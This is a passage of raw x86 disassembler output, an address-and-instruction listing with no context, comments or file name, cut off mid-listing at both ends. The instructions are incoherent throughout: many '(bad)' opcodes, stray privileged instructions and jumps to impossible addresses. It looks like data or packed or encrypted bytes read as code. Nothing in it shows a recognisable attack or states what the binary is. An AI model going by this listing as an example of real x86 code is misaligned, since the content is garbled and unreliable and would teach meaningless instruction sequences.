  403cac:	mov    eax,DWORD PTR [eax]
  403cae:	in     al,dx
  403caf:	(bad)  
  403cb0:	push   ebp
  403cb1:	push   ebx
  403cb2:	xchg   ebx,eax
  403cb3:	push   eax
  403cb4:	or     al,0x5
  403cb6:	or     BYTE PTR [edi],cl
  403cb8:	add    BYTE PTR [eax],al
  403cba:	leave  
  403cbb:	lods   eax,DWORD PTR ds:[esi]
  403cbc:	push   eax
  403cbd:	call   0x401ded
  403cc2:	xchg   ebx,eax
  403cc3:	aad    0x8b
  403cc5:	fadd   DWORD PTR [ebx+0x1d8b0860]
  403ccb:	or     ebx,ebp
  403ccd:	add    dh,BYTE PTR [esp+eax*1+0xb]
  403cd1:	leave  
  403cd2:	in     al,0x11
  403cd4:	cmp    BYTE PTR [esi],0xe2
  403cd7:	popa   
  403cd8:	cmc    
  403cd9:	or     eax,DWORD PTR [ecx]
  403cdb:	popa   
  403cdc:	add    ah,BYTE PTR [ecx+edx*4+0x55aac023]
  403ce3:	test   BYTE PTR [ebp-0x1a],dh
  403ce6:	inc    ebx
  403ce7:	retf   0x5e5b
  403cea:	iret   
  403ceb:	test   edx,eax
  403ced:	or     BYTE PTR [eax-0x6b46aa05],bl
  403cf3:	or     al,BYTE PTR [eax]
  403cf5:	add    BYTE PTR [eax],bl
  403cf7:	sbb    dl,dl
  403cf9:	nop
  403cfa:	imul   esi,DWORD PTR [ebx-0x70],0xffffffac
  403cfe:	xor    DWORD PTR [eax-0x1],eax
  403d01:	mov    ch,0x71
  403d03:	inc    eax
  403d04:	adc    BYTE PTR [ebx],ch
  403d06:	mov    eax,ds:0xb2900545
  403d0b:	repnz or eax,0x1e7bf290
  403d11:	nop
  403d12:	add    ah,ah
  403d14:	lods   eax,DWORD PTR ds:[esi]
  403d15:	jae    0x403c9a
  403d17:	jae    0x403d08
  403d19:	jae    0x403d5e
  403d1b:	or     eax,0x3b7c7420
  403d20:	sbb    al,0xd
  403d22:	nop
  403d23:	mov    esi,0x320407ac
  403d28:	mov    al,ds:0x60703c42
  403d2d:	dec    edi
  403d2e:	or     esp,DWORD PTR [ebp+0x1a]
  403d31:	je     0x403db2
  403d33:	aaa    
  403d34:	les    eax,FWORD PTR [eax+edx*4+0x32]
  403d38:	add    BYTE PTR [edx+0x3c],0x90
  403d3c:	inc    eax
  403d3d:	dec    edi
  403d3e:	or     al,BYTE PTR [ebp+0x1a]
  403d41:	je     0x403dc2
  403d43:	xor    al,0x84
  403d45:	inc    esi
  403d46:	add    esp,ecx
  403d48:	(bad)
  403d4d:	xchg   esp,eax
  403d4e:	sar    ebx,0xb5
  403d51:	jp     0x403d15
  403d53:	cs push 0x7b29e8c4
  403d59:	jae    0x403ce6
  403d5b:	cli    
  403d5c:	aas    
  403d5d:	sub    eax,0x7a84f25b
  403d62:	in     al,dx
  403d63:	bound  edi,QWORD PTR [edi+0x35]
  403d66:	cld    
  403d67:	stos   BYTE PTR es:[edi],al
  403d68:	test   bl,bh
  403d6a:	(bad)  
  403d6b:	mov    edx,0xba8ff384
  403d70:	ins    BYTE PTR es:[edi],dx
  403d71:	dec    DWORD PTR [edi+0x22e21b62]
  403d77:	add    cl,al
  403d79:	or     BYTE PTR [eax+0x1e3a9973],bh
  403d7f:	into   
  403d80:	xchg   BYTE PTR [eax+0x10ffbc6c],bl
  403d86:	inc    ebx
  403d87:	les    ecx,FWORD PTR [ecx+0x53425910]
  403d8d:	rcr    BYTE PTR [ecx+0x2c],0xc1
  403d91:	mov    DWORD PTR [edi],ebp
  403d93:	pop    es
  403d94:	ror    DWORD PTR [ecx+0x45c10700],0xc7
  403d9b:	je     0x403d57
  403d9d:	leave  
  403d9e:	jns    0x403dce
  403da0:	out    0x61,al
  403da2:	mov    al,ds:0x34092dc2
  403da7:	jns    0x403dee
  403da9:	xchg   DWORD PTR [ebp-0x413ad020],ebp
  403daf:	xor    DWORD PTR [edx-0x20],ebx
  403db2:	fs inc edi
  403db4:	sbb    eax,0x698f415a
  403db9:	dec    edx
  403dba:	jmp    0x3217828b
  403dbf:	inc    ebx
  403dc0:	xor    DWORD PTR [ecx+0x931ad73],esi
  403dc6:	loop   0x403d8b
  403dc8:	jl     0x403db1
  403dca:	test   DWORD PTR [edi+0x41],edx
  403dcd:	(bad)  
  403dce:	hlt    
  403dcf:	call   FWORD PTR [eax+0x8]
  403dd2:	add    eax,DWORD PTR [esi+ebx*8]
  403dd5:	ds loope 0x403da4
  403dd8:	pop    esp
  403dd9:	lds    edx,FWORD PTR [ecx-0x7b]
  403ddc:	add    dh,ch
  403dde:	or     ecx,ebp
  403de0:	clc    
  403de1:	xchg   BYTE PTR [esi],bh
  403de3:	call   0x4d7efc28
  403de8:	fcom   QWORD PTR [ebx-0x1c]
  403deb:	jmp    0xef2077f3
  403df0:	xchg   BYTE PTR [ecx+ecx*1+0x0],ch
  403df4:	jmp    0x3ac5d42b
  403df9:	addr16 (bad) 
  403dfb:	(bad)  
  403dfc:	mov    ecx,0xe9010cea
  403e01:	xor    dh,BYTE PTR [ecx+0x935374d]
  403e07:	or     ebp,DWORD PTR [ecx]
  403e09:	je     0x403d93
  403e0b:	lods   al,BYTE PTR ds:[esi]
  403e0c:	jmp    0xe57d4743
  403e11:	xor    ecx,DWORD PTR [ecx]
  403e13:	add    dh,ah
  403e15:	mov    ch,0x6a
  403e17:	add    cl,ch
  403e19:	xor    ch,BYTE PTR [edi]
  403e1b:	add    BYTE PTR [edi+esi*4-0x48],dh
  403e1f:	(bad)  
  403e20:	fidiv  WORD PTR [ebp+0x59]
  403e23:	call   0x49cd43
  403e28:	pop    esp
  403e29:	scas   eax,DWORD PTR es:[edi]
  403e2a:	mov    eax,0x58fdc6fe
  403e2f:	call   0x4355d
  403e34:	loop   0x403e28
  403e36:	cmp    eax,0x50b7411c
  403e3b:	inc    ecx
  403e3c:	jmp    0xa033ccd0
  403e41:	add    ch,dh
  403e43:	ret    
  403e44:	push   eax
  403e45:	sub    DWORD PTR [eax-0x45],0x3de58eff
  403e4c:	or     BYTE PTR [ecx],bl
  403e4e:	or     eax,0xf57ef6ce
  403e53:	scas   eax,DWORD PTR es:[edi]
  403e54:	pcmpeqd mm0,QWORD PTR [edi+0x1648d11]
  403e5b:	ret    
  403e5c:	jmp    DWORD PTR [esi+0x2]
  403e5f:	mov    cl,0x60
  403e61:	push   edi
  403e62:	cmc    
  403e63:	ret    
  403e64:	mov    DWORD PTR [esi+ebx*8-0x3e],ebp
  403e68:	dec    DWORD PTR [esi+0x58]
  403e6b:	or     DWORD PTR [edx+0x0],ebp
  403e6e:	cwde   
  403e6f:	popa   
  403e70:	add    ch,BYTE PTR [edx-0x68]
  403e73:	popa   
  403e74:	add    ebp,DWORD PTR [eax-0x78]
  403e77:	pop    es
  403e78:	add    al,al
  403e7a:	inc    edi
  403e7b:	fwait
  403e7c:	in     al,dx
  403e7d:	(bad)  
  403e7e:	push   edi
  403e7f:	aad    0xe8
  403e81:	pop    edi
  403e82:	inc    ebp
  403e83:	or     BYTE PTR [eax],al
  403e85:	mov    ebp,ecx
  403e87:	iret   
  403e88:	inc    eax
  403e89:	je     0x403e0b
  403e8b:	aam    0x75
  403e8d:	adc    BYTE PTR [edi],dh
  403e8f:	pop    ebx
  403e90:	or     al,0xff
  403e92:	(bad)  
  403e94:	call   0x157490
  403e99:	mov    eax,DWORD PTR [eax-0x2b]
  403e9c:	jne    0x403e96
  403e9e:	pusha  
  403e9f:	add    ebp,ebx
  403ea1:	add    BYTE PTR [eax-0x3e],bl
  403ea4:	fidiv  DWORD PTR [ebp+0x0]
  403ea7:	push   ebx
  403ea8:	into   
  403ea9:	mov    ch,0xec
  403eab:	iretw  
  403ead:	(bad)  
  403eae:	call   0x40af5b
  403eb3:	out    0x98,eax
  403eb5:	in     al,dx
  403eb6:	(bad)  
  403eb7:	out    0xce,eax
  403eb9:	call   0xf1927
  403ebe:	mov    ebx,ebx
  403ec0:	repnz enter 0x14c2,0x7
  403ec5:	push   ebp
  403ec6:	mov    esi,DWORD PTR [esp+ecx*4-0x3159133c]
  403ecd:	call   DWORD PTR [ebx-0x49]
  403ed0:	pop    eax
  403ed1:	or     al,0xff
  403ed3:	fnstsw WORD PTR [esi+0x4c10bd67]
  403ed9:	add    bh,bh
  403edb:	popf   
  403edc:	jl     0x403f26
  403ede:	inc    ecx
  403edf:	fcomp  st(6)
  403ee1:	pop    edx
  403ee2:	cmc    
  403ee3:	addr16 into 
  403ee5:	or     eax,eax
  403ee7:	xor    DWORD PTR [ebx-0x4fce2580],ebp
  403eed:	add    ebp,DWORD PTR [ebx]
  403eef:	mov    bh,BYTE PTR ds:0x3a7ef81
  403ef5:	retf   
  403ef6:	push   eax
  403ef7:	or     DWORD PTR [esp+eax*1+0x33483100],esi
  403efe:	fnsave [ecx]
  403f00:	mov    al,0xfe
  403f02:	mov    edi,0x892c36
  403f07:	xor    DWORD PTR [eax+0x30000408],esi
  403f0d:	mov    al,0x3
  403f0f:	movzx  edi,dh
  403f12:	add    eax,DWORD PTR [eax]
  403f14:	xor    DWORD PTR ds:0x801fc41,esi
  403f1a:	pop    edi
  403f1b:	jmp    0x85b8f276
  403f20:	pop    esi
  403f21:	stos   BYTE PTR es:[edi],al
  403f22:	retf   0xe1ff
  403f25:	xlat   BYTE PTR ds:[ebx]
  403f26:	cmp    bh,ch
  403f28:	ds (bad) 
  403f2b:	mov    edi,0xae5bb3bc
  403f30:	jns    0x403f23
  403f32:	add    ecx,DWORD PTR [ebp-0x362d54]
  403f38:	push   ds
  403f39:	and    ah,bl
  403f3b:	mov    DWORD PTR [ebx+esi*2],ebx
  403f3e:	retf   0x84ff
  403f41:	mov    eax,0x9cdde833
  403f46:	retf   0xaff
  403f49:	stos   DWORD PTR es:[edi],eax
  403f4a:	retf   0x2975
  403f4d:	gs sub bh,0xef
  403f51:	mov    cl,dl
  403f53:	push   eax
  403f54:	fst    DWORD PTR [edx]
  403f56:	sar    edi,1
  403f58:	ficomp WORD PTR [edi]
  403f5a:	retf   
  403f5b:	jne    0x403f32
  403f5d:	pop    ds
  403f5e:	fsub   QWORD PTR ds:0xca6608da
  403f64:	cmp    cl,cl
  403f66:	aad    0x36
  403f68:	mov    esi,0x9fdb553b
  403f6d:	scas   eax,DWORD PTR es:[edi]
  403f6e:	dec    esi
  403f6f:	retf   0xb800
  403f72:	dec    ebx
  403f73:	inc    ecx
  403f74:	xchg   BYTE PTR [ecx+eax*8],ah
  403f77:	jmp    0xacd432cb
  403f7c:	iret   
  403f7d:	add    edx,eax
  403f7f:	mov    ah,0xc7
  403f81:	cdq    
  403f82:	addr16 inc esp
  403f84:	add    esi,DWORD PTR [ecx]
  403f86:	mov    WORD PTR [ecx],gs
  403f88:	dec    ebx
  403f89:	inc    ebx
  403f8a:	ret    0xcf9c
  403f8d:	mov    DWORD PTR [ebx],edi
  403f8f:	sub    eax,0x290e3103
  403f94:	dec    edi
  403f95:	mulps  xmm7,xmm6
  403f98:	dec    edi
  403f99:	pop    ecx
  403f9a:	mov    al,0x4a
  403f9c:	aam    0x56
  403f9e:	shl    DWORD PTR [edx-0x55],0xe9
  403fa2:	rcr    DWORD PTR [esp+ecx*8-0x1e],0x58
  403fa7:	shl    DWORD PTR [edi-0x36293ec0],1
  403fad:	mov    esp,0xd2bc1bc
  403fb2:	or     ch,cl
  403fb4:	jl     0x404022
  403fb6:	or     eax,0x91194fbe
  403fbb:	jmp    0xaefacb9b
  403fc0:	leave  
  403fc1:	push   cs
  403fc2:	aaa    
  403fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fc4:	fcom   QWORD PTR [eax]
  403fc6:	mov    dl,0x9e
  403fc8:	leave  
  403fc9:	stos   BYTE PTR es:[edi],al
  403fca:	int3   
  403fcb:	xor    bh,BYTE PTR [ebx+0x2ee911f3]
  403fd1:	mov    edx,0x7d1ead
  403fd6:	adc    DWORD PTR fs:[edx+0xb487f3],edx
  403fdd:	out    dx,eax
  403fde:	push   esp
  403fdf:	dec    eax
  403fe0:	add    DWORD PTR [ecx+0x30],esp
  403fe3:	dec    eax
  403fe4:	and    BYTE PTR [esi],0x2d
  403fe7:	ss cmc 
  403fe9:	mov    esi,0x168047f9
  403fee:	or     eax,0x3869ea35
  403ff3:	push   cs
  403ff4:	je     0x404042
  403ff6:	lods   eax,DWORD PTR ds:[esi]
  403ff7:	add    BYTE PTR [edx],cl
  403ff9:	mov    ch,0x92
  403ffb:	mov    DWORD PTR [edi],edi
  403ffd:	loopne 0x403fe5
  403fff:	jecxz  0x403f8c
  404001:	lods   al,BYTE PTR ds:[esi]
  404002:	mov    bh,BYTE PTR [edi-0x3e950e8b]
  404008:	fucomi st,st(1)
  40400a:	xor    cl,BYTE PTR [eax+edi*8+0x7fe7e0e9]
  404011:	lea    edi,[edx]
  404013:	shl    BYTE PTR [eax],0x7d
  404016:	push   edi
  404017:	inc    eax
  404018:	jl     0x403fdb
  40401a:	imul   ecx,DWORD PTR [esi],0x3db2e774
  404020:	cmp    dh,ch
  404022:	dec    esp
  404023:	cmp    al,0x7
  404025:	imul   ebp,esi,0xeff0ff00
  40402b:	pop    es
  40402c:	(bad)  
  40402d:	sub    eax,0xc200c025
  404032:	xor    al,0xb4
  404034:	add    dl,dl
  404036:	ficomp WORD PTR [edi-0x37]
  404039:	stos   DWORD PTR es:[edi],eax
  40403a:	add    BYTE PTR [esi],bl
  40403c:	rcl    BYTE PTR [edx+eiz*2-0x2],0x8b
  404041:	(bad)  
  404042:	lds    eax,FWORD PTR [ebp-0x74]
  404045:	cmp    eax,0x4a454d
  40404a:	jmp    0xd4c35bbd
  40404f:	call   0x935:0x32e94153
  404056:	add    BYTE PTR [ebx+0x7],bl
  404059:	nop
  40405a:	dec    ebx
  40405b:	or     DWORD PTR ds:0x1cc77500,eax
  404061:	rcr    BYTE PTR [ebx-0x6f],0xc5
  404065:	or     BYTE PTR [eax],al
  404067:	and    ebp,DWORD PTR [esi-0x39]
  40406a:	inc    ebp
  40406b:	fs or  al,0x0
  40406e:	add    al,cl
  404070:	ss inc ebp
  404072:	clc    
  404073:	call   0x8248b648
  404078:	or     edi,edi
  40407a:	adc    eax,0x40fcb4
  40407f:	xchg   ebx,eax
  404080:	retf   
  404081:	je     0x4040de
  404083:	lock loop 0x404061
  404086:	add    BYTE PTR [eax-0x2a722fc4],bl
  40408c:	iret   
  40408d:	push   eax
  40408e:	push   0x68
  404090:	cmc    
  404091:	(bad)  
  404092:	adc    eax,0x40fce8
  404097:	arpl   bx,cx
  404099:	je     0x4040c4
  40409b:	pop    ss
  40409c:	jmp    ebx
  40409e:	add    DWORD PTR [eax],eax
  4040a0:	dec    eax
  4040a1:	or     eax,DWORD PTR [eax]
  4040a3:	inc    ebp
  4040a5:	ror    DWORD PTR [edi+0x75c76045],cl
  4040ab:	cld    
  4040ac:	iret   
  4040ad:	dec    ecx
  4040ae:	in     al,dx
  4040af:	sbb    ebp,0xffffffc0
  4040b2:	push   DWORD PTR [ebx+0x11]
  4040b5:	add    BYTE PTR [ebp-0x10],0x1a
  4040b9:	or     eax,DWORD PTR [eax]
  4040bb:	add    BYTE PTR [ebx],al
  4040bd:	mov    edi,0x5d845c6
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	sbb    BYTE PTR [ecx+0x0],ah
  4040c7:	push   0x18
  4040c9:	popa   
  4040ca:	adc    BYTE PTR [ebp+0x6a50a955],cl
  4040d0:	xor    DWORD PTR [eax-0x701a8a3a],esi
  4040d6:	icebp  
  4040d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d8:	jp     0x4040cb
  4040da:	add    ecx,DWORD PTR [ebx]
  4040dc:	icebp  
  4040dd:	mov    ah,0x4
  4040df:	inc    ebx
  4040e0:	mov    dl,0xb5
  4040e2:	iret   
  4040e3:	add    BYTE PTR [ebp-0x58],al
  4040e6:	(bad)  
  4040e7:	jne    0x4040a6
  4040e9:	pop    eax
  4040ea:	stc    
  4040eb:	fidiv  DWORD PTR [ecx]
  4040ed:	mov    al,0x7a
  4040ef:	ret    
  4040f0:	pop    edx
  4040f1:	jmp    0x757149b7
  4040f6:	jp     0x4040e4
  4040f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f9:	jge    0x4040f6
  4040fb:	out    0x36,eax
  4040fd:	jmp    0x404102
  4040ff:	add    cl,dh
  404101:	lahf   
  404102:	fild   DWORD PTR [ecx+0x0]
  404105:	sub    edi,0x9d8650c6
  40410b:	sti    
  40410c:	dec    edi
  40410d:	mov    DWORD PTR [edx+ebp*4-0x4387cf00],esi
  404114:	ret    0xb035
  404117:	xor    BYTE PTR [ebx-0x33fccab],cl
  40411d:	add    dh,BYTE PTR [ebx]
  40411f:	dec    ecx
  404120:	or     BYTE PTR [ecx],dh
  404122:	cmp    eax,0x9b712afe
  404127:	mov    esp,0x1ab039c2
  40412c:	fcmovne st,st(3)
  40412e:	scas   eax,DWORD PTR es:[edi]
  40412f:	pop    ecx
  404130:	add    bl,cl
  404132:	scas   eax,DWORD PTR es:[edi]
  404133:	pop    ecx
  404134:	add    BYTE PTR [esi],ch
  404136:	push   ebp
  404137:	clc    
  404138:	(bad)  
  404139:	pushf  
  40413a:	mov    eax,0xb08b0059
  40413f:	(bad)  [esi]
  404141:	cli    
  404142:	scas   eax,DWORD PTR es:[edi]
  404143:	add    ecx,DWORD PTR [ebx]
  404145:	icebp  
  404146:	repz jns 0xc6e54ab9
  40414d:	test   BYTE PTR [ebp-0x41f9326f],bh
  404153:	xchg   esi,eax
  404154:	cli    
  404155:	scas   al,BYTE PTR es:[edi]
  404156:	xor    al,0xc4
  404158:	jp     0x404163
  40415a:	xor    ebp,ecx
  40415c:	pop    ecx
  40415d:	xor    DWORD PTR [esi-0x417d380c],edi
  404163:	cld    
  404164:	test   edi,0x59e133
  40416a:	xor    DWORD PTR [ebx],esi
  40416c:	jmp    0xea226d4c
  404171:	add    ebp,DWORD PTR [edx]
  404173:	leave  
  404174:	fdiv   st(3),st
  404176:	add    esi,DWORD PTR [ecx-0x4259296f]
  40417c:	adc    ch,BYTE PTR [ebx-0x435d3656]
  404182:	jae    0x404194
  404184:	jmp    0xc3ecfbb9
  404189:	mov    BYTE PTR [esi-0x49240ecd],0xbd
  404190:	push   ds
  404191:	(bad)  
  404192:	push   0x403edca
  404197:	xchg   edx,eax
  404198:	std    
  404199:	and    esp,0x374fe90c
  40419f:	mov    bh,BYTE PTR [ebx+edi*8+0x56]
  4041a3:	xor    al,0xef
  4041a5:	sbb    dh,BYTE PTR [ecx-0x31]
  4041a8:	sub    edi,ebx
  4041aa:	inc    esi
  4041ab:	das    
  4041ac:	jmp    0xde4d0675
  4041b1:	dec    edi
  4041b2:	sub    DWORD PTR [ecx+0x931a9af],esi
  4041b8:	loop   0x40417d
  4041ba:	popf   
  4041bb:	sbb    DWORD PTR [eax+0x34bc2d57],ebx
  4041c1:	clc    
  4041c2:	pop    ss
  4041c3:	aaa    
  4041c4:	add    cl,ah
  4041c6:	jmp    0x18b0:0xecaeff4c
  4041cd:	jb     0x4041cf
  4041cf:	ds or  eax,0x36d53940
  4041d5:	out    dx,eax
  4041d6:	xchg   esi,eax
  4041d7:	hlt    
  4041d8:	pop    ecx
  4041d9:	call   DWORD PTR [ecx+ebp*8]
  4041dc:	dec    esp
  4041dd:	(bad)  
  4041de:	cld    
  4041df:	fisub  DWORD PTR [edi+ebx*4+0x58bcec8e]
  4041e6:	mov    al,ds:0x140011f3
  4041eb:	dec    eax
  4041ec:	lods   eax,DWORD PTR ds:[esi]
  4041ed:	push   esi
  4041ee:	mov    esi,0xf17d8801
  4041f3:	xor    dh,BYTE PTR [esi]
  4041f5:	or     DWORD PTR [edx],eax
  4041f7:	jne    0x404259
  4041f9:	pop    edi
  4041fa:	scas   eax,DWORD PTR es:[edi]
  4041fb:	jmp    0x4041c4
  4041fd:	or     cl,ch
  4041ff:	sbb    DWORD PTR [esi+0xc],eax
  404202:	push   0xffffff8d
  404204:	or     cl,BYTE PTR [ebx]
  404206:	sub    ecx,esp
  404208:	adc    DWORD PTR [ebx],ebp
  40420a:	sub    DWORD PTR [eax+0x5c],ebx
  40420d:	pop    esi
  40420e:	xor    BYTE PTR [ebx+0x11],dh
  404211:	add    BYTE PTR [edx+0x4e],dh
  404214:	or     eax,0x8f6a9c8b
  404219:	inc    BYTE PTR [edx]
  40421b:	clc    
  40421c:	and    cl,BYTE PTR [ebx+0x30bdb2ef]
  404222:	jnp    0x40427c
  404224:	cmp    al,0xfc
  404226:	mov    al,0xfd
  404228:	add    eax,0xb022fd80
  40422d:	sub    eax,0x724a7669
  404232:	in     al,dx
  404233:	add    BYTE PTR [edx+0x2d5e46bd],dh
  404239:	cmp    al,0xec
  40423b:	sub    BYTE PTR [ebp+0x3000ac4],ch
  404241:	mov    cl,0x7f
  404243:	cld    
  404244:	imul   edx,DWORD PTR [edi+0xd],0x775dc480
  40424b:	or     BYTE PTR [eax-0x337f9e2c],bl
  404251:	shr    edx,0x9
  404254:	jecxz  0x40421d
  404256:	pop    ebx
  404257:	pop    edi
  404258:	es add dl,0x8
  40425c:	fadd   DWORD PTR [ebx]
  40425e:	xor    BYTE PTR [edx-0x20],dh
  404261:	add    edi,DWORD PTR [ecx]
  404263:	ja     0x404231
  404265:	adc    esi,DWORD PTR [eax]
  404267:	jmp    0x404266
  404269:	add    eax,DWORD PTR [ecx+0x72]
  40426c:	rol    BYTE PTR [ebx],cl
  40426e:	inc    esi
  40426f:	ja     0x40423f
  404271:	adc    eax,DWORD PTR [ecx+0x4]
  404274:	ret    0x17e0
  404277:	cmp    al,0x79
  404279:	pop    ecx
  40427a:	or     bh,BYTE PTR [esi+ebp*2]
  40427d:	dec    esp
  40427e:	push   es
  40427f:	sub    al,0x69
  404281:	mov    ebx,0x20a1eb09
  404286:	rcr    BYTE PTR [ebx-0x59],0xe5
  40428a:	enter  0x90c2,0x7
  40428e:	shl    al,0x8c
  404291:	rol    ebx,0xaa
  404294:	ret    
  404295:	add    BYTE PTR [ebx-0x3fa5ff3a],al
  40429b:	fidiv  DWORD PTR [ebp-0x27]
  40429e:	pop    DWORD PTR [ecx]
  4042a0:	add    BYTE PTR [eax+0x7],cl
  4042a3:	pop    ebx
  4042a4:	pop    edi
  4042a5:	mov    dh,0x7e
  4042a7:	ret    0x5808
  4042aa:	in     al,dx
  4042ab:	push   edx
  4042ac:	push   eax
  4042ad:	mov    al,ds:0x82a1f5f
  4042b2:	add    eax,0xc24972f8
  4042b7:	(bad)  
  4042b8:	mov    ebx,0x3b131
  4042bd:	xor    DWORD PTR [ebx-0x4f8fb26b],ecx
  4042c3:	sub    eax,0x42d87e01
  4042c8:	std    
  4042c9:	push   cs
  4042ca:	je     0x4042b3
  4042cc:	xlat   BYTE PTR ds:[ebx]
  4042cd:	add    eax,0xfeb9c3c0
  4042d2:	arpl   bx,ax
  4042d4:	inc    DWORD PTR [ebx]
  4042d6:	dec    ebx
  4042d7:	cld    
  4042d8:	push   es
  4042d9:	mov    BYTE PTR fs:[edi-0x3914753d],cl
  4042e0:	push   ebp
  4042e1:	stos   BYTE PTR es:[edi],al
  4042e2:	xchg   esp,eax
  4042e3:	xchg   esp,eax
  4042e5:	loope  0x404306
  4042e7:	push   esp
  4042e8:	pop    eax
  4042e9:	pop    ecx
  4042ea:	sbb    esi,ebp
  4042ec:	aas    
  4042ed:	xor    DWORD PTR [eax],edi
  4042ef:	ss add edx,esi
  4042f2:	and    eax,DWORD PTR [edi+0x4477a13d]
  4042f8:	add    BYTE PTR [ecx],dh
  4042fa:	fcom   QWORD PTR ds:0x38640083
  404300:	dec    edi
  404301:	inc    ecx
  404302:	xor    DWORD PTR [eax-0x424df6c9],esi
  404308:	lahf   
  404309:	dec    ebx
  40430a:	lock scas eax,DWORD PTR es:[edi]
  40430c:	add    esi,DWORD PTR [ebp+0x2c]
  40430f:	pop    es
  404310:	les    ebx,FWORD PTR [ebx+0x68]
  404313:	out    dx,eax
  404314:	out    dx,al
  404315:	fimul  DWORD PTR [ecx+0x3100dc8e]
  40431b:	and    eax,0x8603fc59
  404320:	or     edx,DWORD PTR [eax+0x5e]
  404323:	fst    QWORD PTR [ebx+0xeaff04b]
  404329:	sar    BYTE PTR [esi],0x2c
  40432c:	xchg   esp,eax
  40432d:	add    BYTE PTR [ecx],dh
  40432f:	mov    al,0xca
  404331:	inc    ebp
  404332:	cmp    DWORD PTR [ecx],ecx
  404334:	jmp    0x6c49743c
  404339:	dec    eax
  40433a:	sub    DWORD PTR [ecx+0x43],ebx
  40433d:	add    al,0x9b
  40433f:	or     DWORD PTR [ebx+0x5],eax
  404342:	push   ds
  404343:	xor    al,0xc5
  404345:	ret    0xa13c
  404348:	xor    al,BYTE PTR [ebp+0x31]
  40434b:	push   cs
  40434c:	test   eax,0xf7b19b38
  404351:	fdiv   QWORD PTR [ecx]
  404353:	or     DWORD PTR [edx-0x45],ebp
  404356:	jnp    0x40438c
  404358:	or     DWORD PTR [edi+0x37e9c16c],eax
  40435e:	mov    edi,DWORD PTR [edx-0x36ff43ec]
  404364:	lods   al,BYTE PTR ds:[esi]
  404365:	xchg   esp,eax
  404366:	ret    0x8fd6
  404369:	and    al,0xb8
  40436b:	mov    esp,0xc6537143
  404370:	xor    esi,DWORD PTR [ecx-0x3e]
  404373:	inc    esp
  404374:	mov    ch,0xd3
  404376:	add    al,0xb6
  404378:	xor    ebx,DWORD PTR [ebp-0x3e]
  40437b:	inc    esp
  40437c:	mov    eax,ds:0xe3144a2
  404381:	sub    DWORD PTR [edi],esi
  404383:	dec    edi
  404384:	mov    gs,WORD PTR [edi+esi*4+0x486c18aa]
  40438b:	sbb    DWORD PTR [eax-0x65],0xa29d1cc2
  404392:	inc    esp
  404393:	xor    DWORD PTR [esi],ecx
  404395:	sub    DWORD PTR [edi],esi
  404397:	sbb    esi,DWORD PTR [ecx]
  404399:	gs push eax
  40439b:	lock or BYTE PTR [esi],dl
  40439e:	cmp    BYTE PTR [ecx-0x50],ah
  4043a1:	std    
  4043a2:	fidiv  DWORD PTR [ecx]
  4043a4:	or     edx,esi
  4043a6:	ret    
  4043a7:	fadd   QWORD PTR [edi]
  4043a9:	stos   BYTE PTR es:[edi],al
  4043aa:	ret    0xb8c4
  4043ad:	add    BYTE PTR [ecx],al
  4043af:	jmp    eax
  4043b1:	add    cl,ch
  4043b3:	jae    0x4043e8
  4043b5:	hlt    
  4043b6:	shr    DWORD PTR [ebx+ebp*4+0x3ef0deff],1
  4043bd:	cld    
  4043be:	shr    DWORD PTR [esi-0x2f],0x0
  4043c2:	jmp    0xb09c1074
  4043c7:	add    ah,ch
  4043c9:	pop    esi
  4043ca:	mov    ecx,ebp
  4043cc:	mov    dl,0xcd
  4043ce:	shl    BYTE PTR [edi+0x1953b8f0],0x5d
  4043d5:	and    DWORD PTR [eax-0x2e],eax
  4043d8:	jb     0x4043e3
  4043da:	clc    
  4043db:	sbb    esi,DWORD PTR [edx]
  4043dd:	int3   
  4043de:	jmp    FWORD PTR [edx-0x1a]
  4043e1:	pop    esp
  4043e2:	dec    ebx
  4043e3:	sub    BYTE PTR ds:0xade27409,dh
  4043e9:	not    BYTE PTR [edi+0x32]
  4043ec:	jb     0x4043f7
  4043ee:	add    ch,bh
  4043f0:	sbb    al,0x8c
  4043f2:	cmp    eax,0x4a6c59
  4043f7:	jmp    0x1cc345fa
  4043fc:	leave  
  4043fd:	inc    esp
  4043fe:	inc    ecx
  4043ff:	jmp    0x2458236
  404404:	jne    0x40445a
  404406:	leave  
  404407:	sub    al,BYTE PTR [ebx+edx*8+0x43e6d4ff]
  40440e:	inc    ecx
  40440f:	jmp    0x273492cf
  404414:	mov    dh,0xc5
  404416:	(bad)  
  404417:	es jo  0x4043fb
  40441a:	add    cl,ch
  40441c:	xor    ah,BYTE PTR [ebx]
  40441e:	add    BYTE PTR [ebx+0x3173a12c],al
  404424:	xor    eax,0x30008309
  404429:	retf   0x840f
  40442c:	add    BYTE PTR [esi+0xb],ch
  40442f:	add    BYTE PTR [eax],al
  404431:	ror    DWORD PTR [edi-0x36b00138],1
  404437:	lea    eax,[ebp-0x3584]
  40443d:	push   0xfec8b5ca
  404442:	enter  0xe8ff,0x60
  404446:	aad    0x0
  404448:	add    BYTE PTR [ebx],ah
  40444a:	int3   
  40444b:	je     0x40501c
  404451:	jo     0x404445
  404453:	dec    esp
  404454:	inc    ecx
  404455:	or     BYTE PTR [edi-0x37310f7b],al
  40445b:	call   DWORD PTR [eax-0x40]
  40445e:	pop    esp
  40445f:	fld    DWORD PTR [eax]
  404461:	fadd   DWORD PTR [eax+eax*8]
  404464:	andps  xmm1,xmm5
  404467:	add    BYTE PTR [eax],al
  404469:	enter  0x85c0,0xc4
  40446d:	dec    esi
  40446e:	leave  
  40446f:	inc    DWORD PTR [eax]
  404471:	fmul   DWORD PTR [ebx]
  404473:	add    BYTE PTR [ebp-0x12fab],cl
  404479:	dec    edi
  40447a:	pop    esp
  40447b:	push   DWORD PTR [ebp-0x359c]
  404481:	call   FWORD PTR [esi]
  404483:	pop    eax
  404484:	dec    ebx
  404485:	leave  
  404486:	or     ecx,DWORD PTR [ebx-0x35bb6b]
  40448c:	inc    DWORD PTR [ebx+0x840fcb]
  404492:	loopne 0x40449f
  404494:	add    BYTE PTR [eax],al
  404496:	sbb    DWORD PTR [esi-0xc],0xf
  40449a:	add    eax,0x58000099
  40449f:	enter  0xd4b5,0x31
  4044a3:	and    al,al
  4044a5:	dec    ebx
  4044a7:	mov    eax,ds:0xa231002b
  4044ac:	add    eax,0x31e46e8
  4044b1:	add    BYTE PTR [edx],bh
  4044b3:	loop   0x4044eb
  4044b5:	jns    0x40445f
